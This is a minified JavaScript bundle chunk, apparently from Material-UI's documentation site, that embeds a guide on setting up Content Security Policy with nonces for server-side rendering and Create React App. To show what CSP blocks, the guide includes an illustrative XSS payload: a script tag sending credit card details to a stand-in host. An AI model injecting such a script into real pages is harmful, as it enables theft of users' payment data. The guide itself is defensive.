_N_E=(window.webpackJsonp_N_E=window.webpackJsonp_N_E||[]).push([[308],{"6Zym":function(e,n,t){"use strict";t.r(n),t.d(n,"default",(function(){return u}));var o=t("mXGw"),s=t.n(o),i=t("e+1t"),a=t("kVtE"),r=s.a.createElement,c=t("SlSi"),d=t("HNMw");function u(e){var n=e.demos,t=e.docs;return r(i.a,{demos:n,docs:t,requireDemo:c})}u.getInitialProps=function(){var e=Object(a.a)({pageFilename:"guides/content-security-policy",requireRaw:d});return{demos:e.demos,docs:e.docs}}},D0DZ:function(e,n){e.exports="# Content Security Policy (CSP)\n\n<p class=\"description\">This section covers the details of setting up a CSP.</p>\n\n## What is CSP and why is it useful?\n\nCSP mitigates cross-site scripting (XSS) attacks by requiring developers to whitelist the sources their assets are retrieved from. This list is returned as a header from the server. For instance, say you have a site hosted at `https://example.com` the CSP header `default-src: 'self';` will allow all assets that are located at `https://example.com/*` and deny all others. If there is a section of your website that is vulnerable to XSS where unescaped user input is displayed, an attacker could input something like:\n\n```html\n<script>\n  sendCreditCardDetails('https://hostile.example');\n<\/script>\n```\n\nThis vulnerability would allow the attacker to execute anything. However, with a secure CSP header, the browser will not load this script.\n\nYou can read more about CSP on the [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).\n\n## How does one implement CSP?\n\n### Server-Side Rendering (SSR)\n\nTo use CSP with Material-UI (and JSS), you need to use a nonce. A nonce is a randomly generated string that is only used once, therefore you need to add server middleware to generate one on each request. JSS has a [great tutorial](https://github.com/cssinjs/jss/blob/master/docs/csp.md) on how to achieve this with Express and React Helmet. For a basic rundown, continue reading.\n\nA CSP nonce is a Base 64 encoded string. You can generate one like this:\n\n```js\nimport uuidv4 from 'uuid/v4';\n\nconst nonce = new Buffer(uuidv4()).toString('base64');\n```\n\nYou must use UUID version 4, as it generates an **unpredictable** string.\nYou then apply this nonce to the CSP header. A CSP header might look like this with the nonce applied:\n\n```js\nheader('Content-Security-Policy').set(\n  `default-src 'self'; style-src: 'self' 'nonce-${nonce}';`,\n);\n```\n\nYou should pass the nonce in the `<style>` tag on the server.\n\n```jsx\n<style\n  id=\"jss-server-side\"\n  nonce={nonce}\n  dangerouslySetInnerHTML={{\n    __html: sheets.toString(),\n  }}\n/>\n```\n\nThen, you must pass this nonce to JSS so it can add it to subsequent `<style>` tags.\n\nThe way that you do this is by passing a `<meta property=\"csp-nonce\" content={nonce} />` tag in the `<head>` of your HTML. JSS will then, by convention, look for a `<meta property=\"csp-nonce\"` tag and use the `content` value as the nonce.\n\nHere is an example of what a fictional header could look like:\n\n```html\n<head>\n  <meta property=\"csp-nonce\" content=\"this-is-a-nonce-123\" />\n</head>\n```\n\n### Create React App (CRA)\n\nAccording to the [Create React App Docs](https://create-react-app.dev/docs/advanced-configuration/), a Create React App will dynamically embed the runtime script into index.html during the production build by default. This will require a new hash to be set in your CSP during each deployment.\n\nTo use a CSP with a project initialized as a Create React App, you will need to set the `INLINE_RUNTIME_CHUNK=false` variable in the `.env` file used for your production build. This will import the runtime script as usual instead of embedding it, avoiding the need to set a new hash during each deployment.\n"},HNMw:function(e,n,t){var o={"./content-security-policy.md":"D0DZ"};function s(e){var n=i(e);return t(n)}function i(e){if(!t.o(o,e)){var n=new Error("Cannot find module '"+e+"'");throw n.code="MODULE_NOT_FOUND",n}return o[e]}s.keys=function(){return Object.keys(o)},s.resolve=i,e.exports=s,s.id="HNMw"},SlSi:function(e,n){function t(e){var n=new Error("Cannot find module '"+e+"'");throw n.code="MODULE_NOT_FOUND",n}t.keys=function(){return[]},t.resolve=t,e.exports=t,t.id="SlSi"},ZQ7r:function(e,n,t){(window.__NEXT_P=window.__NEXT_P||[]).push(["/guides/content-security-policy",function(){return t("6Zym")}])}},[["ZQ7r",0,2,1,3,5,4,6,7,8,9,10,11,12,13,15,16,14,17,18,19]]]);